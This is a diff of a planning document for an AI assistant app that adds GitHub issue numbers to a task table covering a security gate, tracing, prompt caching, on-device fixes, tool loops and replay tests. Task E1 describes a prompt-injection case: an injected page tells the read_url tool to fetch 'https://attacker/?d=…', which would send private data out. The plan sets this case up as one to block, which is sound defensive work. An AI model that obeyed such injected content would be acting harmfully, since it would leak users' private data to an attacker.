@@ -50,21 +50,21 @@ Sizes follow the issue rule: S ≤ ½ day, M ≤ 2 days, L is split.
 
 | # | Task | Done when | Lane | Size | After |
 |---|---|---|---|---|---|
-| **E1** | Security gate: once a turn holds private data and untrusted content, outbound tools ask first | An injected page asking `read_url` for `https://attacker/?d=…` raises an approval card; a URL the user typed in the thread still runs; offline tests cover both | `AI/ReadingTools`, `AI/UntrustedContent`, `AI/ApprovalCenter` | M | — |
-| **E2** | Recorder: per-turn trace in the turn log | One record per turn: tools sent vs called, rounds, tokens per round, cache-read tokens, characters per prompt section, verifier fires, latency; OpenTelemetry GenAI field names; still opt-in | `Services/DoraXTurnLog`, `AI/Providers` | M | — |
-| **E3** | Prompt order: stable first, a second cache mark, volatile last | E2 shows the cache-read ratio rising on multi-turn Anthropic threads; offline suite green | `AI/ScopedPromptAssembler`, `AI/AnthropicPromptCache` | S | E2 |
+| **E1** #149 | Security gate: once a turn holds private data and untrusted content, outbound tools ask first | An injected page asking `read_url` for `https://attacker/?d=…` raises an approval card; a URL the user typed in the thread still runs; offline tests cover both | `AI/ReadingTools`, `AI/UntrustedContent`, `AI/ApprovalCenter` | M | — |
+| **E2** #150 | Recorder: per-turn trace in the turn log | One record per turn: tools sent vs called, rounds, tokens per round, cache-read tokens, characters per prompt section, verifier fires, latency; OpenTelemetry GenAI field names; still opt-in | `Services/DoraXTurnLog`, `AI/Providers` | M | — |
+| **E3** #151 | Prompt order: stable first, a second cache mark, volatile last | E2 shows the cache-read ratio rising on multi-turn Anthropic threads; offline suite green | `AI/ScopedPromptAssembler`, `AI/AnthropicPromptCache` | S | E2 |
 | E4 | ~~One "question or action?" gate~~ | **Done before this plan** — `ScopedRoutePolicy`, `QuestionNotAnOfferTests` | — | — | — |
-| **E5a** | On-device: keep history, survive overflow, typed errors | A 10-turn on-device chat uses a fact from turn 2; `exceededContextWindowSize` → condense the transcript, new session, retry once; failures are errors, never answer text | `AI/AIProviderService`, `Services/OnDeviceToolBridge` | M | — |
-| **E5b** | On-device: budget with `tokenCount` before sending | No overflow on the E5a test set | same | S | E5a |
-| **E6a** | Tool loop: no-progress stop + one max_tokens table | Two rounds with nothing new end the loop; per-provider limits in one table | `AI/Providers/AIProviderToolLoops` | S | E2 |
-| **E6b** | Tool loop: three loops become one | Adapters only translate request/response formats; offline suite green; no behaviour change in the E2 trace | same | M | E6a |
-| **E7a** | Focus: inspect / act / verify / answer each send their own tool set | Tools sent per round drop in the E2 trace; "answer" sends none | `AI/AgentToolRegistry`, `AI/AIToolBudget` | M | E6b |
-| **E7b** | Approvals survive quitting the app | A pending approval reappears after relaunch and the turn continues or is cleanly cancelled | `AI/ApprovalCenter` | M | — |
-| **E8a** | Replay cases: record query, context and tool outputs from real turns | 50 cases on disk, private data stripped | `Services/DoraXTurnLog`, tests | M | E2; test host #65, #75, #77 |
-| **E8b** | Replay runner: rule checks + retrieval metrics, offline | One command prints the pass rate before and after a change; includes 10 prompt-injection cases | `Context-DockTests/` | M | E8a |
-| **E8c** | Replay judge for answer quality | Judge scores agree with the owner's hand grades on 20 cases | tests | S | E8b |
+| **E5a** #152 | On-device: keep history, survive overflow, typed errors | A 10-turn on-device chat uses a fact from turn 2; `exceededContextWindowSize` → condense the transcript, new session, retry once; failures are errors, never answer text | `AI/AIProviderService`, `Services/OnDeviceToolBridge` | M | — |
+| **E5b** #153 | On-device: budget with `tokenCount` before sending | No overflow on the E5a test set | same | S | E5a |
+| **E6a** #154 | Tool loop: no-progress stop + one max_tokens table | Two rounds with nothing new end the loop; per-provider limits in one table | `AI/Providers/AIProviderToolLoops` | S | E2 |
+| **E6b** #155 | Tool loop: three loops become one | Adapters only translate request/response formats; offline suite green; no behaviour change in the E2 trace | same | M | E6a |
+| **E7a** #156 | Focus: inspect / act / verify / answer each send their own tool set | Tools sent per round drop in the E2 trace; "answer" sends none | `AI/AgentToolRegistry`, `AI/AIToolBudget` | M | E6b |
+| **E7b** #157 | Approvals survive quitting the app | A pending approval reappears after relaunch and the turn continues or is cleanly cancelled | `AI/ApprovalCenter` | M | — |
+| **E8a** #158 | Replay cases: record query, context and tool outputs from real turns | 50 cases on disk, private data stripped | `Services/DoraXTurnLog`, tests | M | E2; test host #65, #75, #77 |
+| **E8b** #159 | Replay runner: rule checks + retrieval metrics, offline | One command prints the pass rate before and after a change; includes 10 prompt-injection cases | `Context-DockTests/` | M | E8a |
+| **E8c** #160 | Replay judge for answer quality | Judge scores agree with the owner's hand grades on 20 cases | tests | S | E8b |
 
-Each task becomes one GitHub issue, created **without** the `ready` label. The builder only
+Each task is one GitHub issue (#149–#160), created **without** the `ready` label. The builder only
 takes `ready` issues, so nothing starts until the owner labels one.
 
 ## 5. Labs, after 1.0 (no issues yet)
@@ -91,11 +91,11 @@ Owner decisions
 | 2026-10-01 | On-device fixes (E5a, E5b) are 1.0: on-device chat ships today and loses its history. |
 
 Next, in order
-1. E1 Security gate
-2. E2 Recorder
-3. E3 Prompt order · E5a → E5b On-device
-4. E6a → E6b → E7a · E7b
-5. E8a → E8b → E8c
+1. #149 E1 Security gate
+2. #150 E2 Recorder
+3. #151 E3 Prompt order · #152 E5a → #153 E5b On-device
+4. #154 E6a → #155 E6b → #156 E7a · #157 E7b
+5. #158 E8a → #159 E8b → #160 E8c
 ```
 
 ## 7. How a task moves
